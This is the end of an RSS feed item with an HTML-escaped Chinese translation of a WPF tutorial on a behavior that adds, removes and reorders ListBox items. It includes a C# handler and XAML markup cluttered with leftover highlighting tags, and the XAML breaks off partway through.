&lt;p&gt;&lt;span&gt;最后，有适当的代码启用或禁用&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;取决于是否存在&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;，&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;是第一个（用于上&lt;/span&gt;&lt;strong&gt;移&lt;/strong&gt;&lt;span&gt;）或最后一个项目&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;（用于&lt;/span&gt;&lt;strong&gt;下移&lt;/strong&gt;&lt;span&gt;&lt;span&gt;）。&lt;/span&gt;&lt;span&gt;这是&lt;/span&gt;&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;在&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;触发&lt;/span&gt;&lt;span&gt;事件&lt;/span&gt;&lt;span&gt;时调用的事件处理程序&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide430275&quot;&gt;隐藏   &lt;span id=&quot;copycode430275&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void SetMoveItemUpButtonIsEnabled(object sender, RoutedEventArgs e)
 {
 &amp;lt;code&amp;gt;    Debug.Assert(sender is Selector);
     &lt;span class=&quot;code-keyword&quot;&gt;var Selector = (Selector)sender;
     &lt;span class=&quot;code-keyword&quot;&gt;var IList = CheckForIList(Selector);
     &lt;span class=&quot;code-keyword&quot;&gt;var itemNumber = Selector.SelectedIndex;
     &lt;span class=&quot;code-keyword&quot;&gt;var Button = (ButtonBase) Selector.GetValue(MoveUpButton);
     Button.IsEnabled = (itemNumber &amp;gt;= &lt;span class=&quot;code-digit&quot;&gt;1 &amp;amp;&amp;amp; itemNumber &amp;lt; IList.Count);
 }&lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;/&lt;span class=&quot;code-leadattribute&quot;&gt;code&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;对于这种需要&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;绑定到&lt;/span&gt;&lt;code&gt;ItemsSource&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;，并需要得到&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;保存为一个附加属性在此功能&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;对于&lt;/span&gt;&lt;/span&gt;&lt;strong&gt;Remove&lt;/strong&gt;&lt;span&gt;函数，只需要知道if &lt;/span&gt;&lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;是否等于-1，这样简单得多。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;使用行为&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;要使用此&lt;/span&gt;&lt;strong&gt;行为，&lt;/strong&gt;&lt;span&gt;只需要一个从&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;控件&lt;/span&gt;&lt;span&gt;派生的列表控件，&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Name&lt;/code&gt;&lt;span&gt;&lt;span&gt;为此控件&lt;/span&gt;&lt;span&gt;关联一个&lt;/span&gt;&lt;span&gt;值，并&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;为每个应该实现的函数定义一个&lt;span&gt;&lt;a href=&quot;http://www.codesocang.com&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;网站源码&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;。在每一个&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt; &lt;strong&gt;XAML&lt;/strong&gt;&lt;span&gt;只包括&lt;/span&gt;&lt;code&gt;ListHelperBahavior&lt;/code&gt;&lt;span&gt;与&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;它有关联&lt;/span&gt;&lt;code&gt;Binding&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;
&lt;div id=&quot;premain242785&quot; class=&quot;pre-action-link&quot;&gt;&lt;span id=&quot;prehide242785&quot;&gt;隐藏   &lt;span id=&quot;preShrink242785&quot;&gt;收缩 &lt;img id=&quot;preimg242785&quot; src=&quot;https://www.codeproject.com/images/arrow-up-16.png&quot; alt=&quot;WPF行为的图像1为按钮提供了添加，删除和重新排列ListBox内容的功能&quot;/&gt;   &lt;span id=&quot;copycode242785&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;XML&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Margin&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;10&quot;&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid.RowDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;RowDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Height&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;*&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;RowDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Height&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Auto&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/Grid.RowDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ListBox&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Name&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;TheList&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;ItemsSource&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;{Binding List}&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;HorizontalAlignment&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Stretch&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;VerticalAlignment&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Stretch&quot;&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ListBox.ItemTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
            &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;DataTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid.ColumnDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ColumnDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Width&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;30&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ColumnDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Width&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;200&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/Grid.ColumnDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;TextBlock&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Text&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;{Binding ItemNumber}&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;TextBlock&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Grid.Column&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;1&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Text&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;{Binding TimeCreated}&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/Grid&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
            &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/DataTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/ListBox.ItemTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/ListBox&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;StackPanel&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Grid.Row&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;2&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Margin&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;-5 5&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Orientation&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Horizontal&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;</description>
<pubDate>Mon, 04 Mar 2019 13:47:00 +0000</pubDate>
<dc:creator>九天飞翼</dc:creator>
<og:description>介绍 我有一种情况，我希望能够将项目添加到列表中，并在列表中移动项目，这似乎是使用a的最简单方法ListBox。我立刻想到了如何以通用的方式做到这一点，然后，也许，可以使用行为来做到这一点。这似乎是一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/langda/p/10473467.html</dc:identifier>
</item>
</channel>
</rss>